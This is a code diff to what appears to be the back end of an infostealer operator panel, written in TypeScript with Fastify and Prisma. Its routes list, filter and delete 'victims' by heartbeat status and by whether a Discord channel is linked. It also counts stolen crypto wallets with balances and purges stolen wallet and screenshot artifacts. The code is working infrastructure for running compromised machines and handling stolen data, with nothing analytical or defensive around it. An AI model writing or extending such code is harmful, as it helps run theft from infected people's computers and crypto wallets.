@@ -1,7 +1,7 @@
 import type { FastifyPluginAsync } from 'fastify';
 import { z } from 'zod';
 import { createReadStream } from 'node:fs';
-import { stat } from 'node:fs/promises';
+import { rm, stat } from 'node:fs/promises';
 import { join } from 'node:path';
 import { prisma } from '../lib/db';
 import { audit } from '../lib/audit';
@@ -17,6 +17,7 @@ const listQuery = z.object({
   status: z.enum(['online', 'stale', 'offline', 'revoked']).optional(),
   tag: z.string().max(64).optional(),
   build: z.string().uuid().optional(),
+  linked: z.enum(['0', '1']).optional(),
   cursor: z.string().uuid().optional(),
   limit: z.coerce.number().int().min(1).max(200).default(50)
 });
@@ -33,6 +34,8 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         ...(query.status ? { status: query.status } : {}),
         ...(query.tag ? { tags: { has: query.tag } } : {}),
         ...(query.build ? { buildId: query.build } : {}),
+        ...(query.linked === '1' ? { discord: { isNot: null } } : {}),
+        ...(query.linked === '0' ? { discord: { is: null } } : {}),
         ...(query.q
           ? {
               OR: [
@@ -114,7 +117,13 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
     });
     if (!victim) throw notFound('victim');
     const balanceCount = await prisma.wallet.count({ where: { victimId: id, NOT: { balance: null } } });
-    return { ...victim, discordChannel: victim.discord?.channelId ?? null, online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000, balances: balanceCount };
+    return {
+      ...victim,
+      discordChannel: victim.discord?.channelId ?? null,
+      discordMissingAt: victim.discord?.missingAt ?? null,
+      online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000,
+      balances: balanceCount
+    };
   });
 
   app.patch('/victims/:id', { preHandler: requireRole('operator') }, async (request) => {
@@ -136,9 +145,53 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
 
   app.delete('/victims/:id', { preHandler: requireRole('admin') }, async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    await prisma.victim.delete({ where: { id } });
-    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.delete', entity: 'victim', entityId: id, ip: request.clientIp });
-    return { ok: true };
+    const victim = await prisma.victim.findUnique({ where: { id }, include: { discord: true } });
+    if (!victim) throw notFound('victim');
+    await prisma.$transaction(async (tx) => {
+      if (victim.discord) {
+        await tx.discordIgnore.upsert({
+          where: { channelId: victim.discord.channelId },
+          update: { reason: `deleted ${victim.hostname} (${victim.id})` },
+          create: { channelId: victim.discord.channelId, reason: `deleted ${victim.hostname} (${victim.id})` }
+        });
+        // The link cascades with the victim; keep the ignore row so the next
+        // sweep does not recreate the victim from the live channel.
+      }
+      await tx.victim.delete({ where: { id } });
+    });
+    await audit(prisma, {
+      operatorId: request.operator?.id,
+      action: 'victim.delete',
+      entity: 'victim',
+      entityId: id,
+      ip: request.clientIp,
+      data: { hostname: victim.hostname, channelId: victim.discord?.channelId ?? null, ignored: Boolean(victim.discord) }
+    });
+    void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { deleted: true } });
+    return { ok: true, ignoredChannel: victim.discord?.channelId ?? null };
+  });
+
+  app.delete('/artifacts/:id', { preHandler: requireRole('admin') }, async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const artifact = await prisma.artifact.findUnique({ where: { id } });
+    if (!artifact) throw notFound('artifact');
+    const counts = await prisma.$transaction(async (tx) => {
+      const wallets = await tx.wallet.deleteMany({ where: { artifactId: id } });
+      const screenshots = await tx.screenshot.deleteMany({ where: { artifactId: id } });
+      await tx.artifact.delete({ where: { id } });
+      return { wallets: wallets.count, screenshots: screenshots.count };
+    });
+    await rm(artifactDir(id), { recursive: true, force: true }).catch(() => undefined);
+    await rm(artifact.containerPath, { force: true }).catch(() => undefined);
+    await audit(prisma, {
+      operatorId: request.operator?.id,
+      action: 'artifact.delete',
+      entity: 'artifact',
+      entityId: id,
+      ip: request.clientIp,
+      data: { module: artifact.module, bytes: artifact.bytes, wallets: counts.wallets, screenshots: counts.screenshots }
+    });
+    return { ok: true, ...counts };
   });
 
   app.get('/victims/:id/wallets', async (request) => {
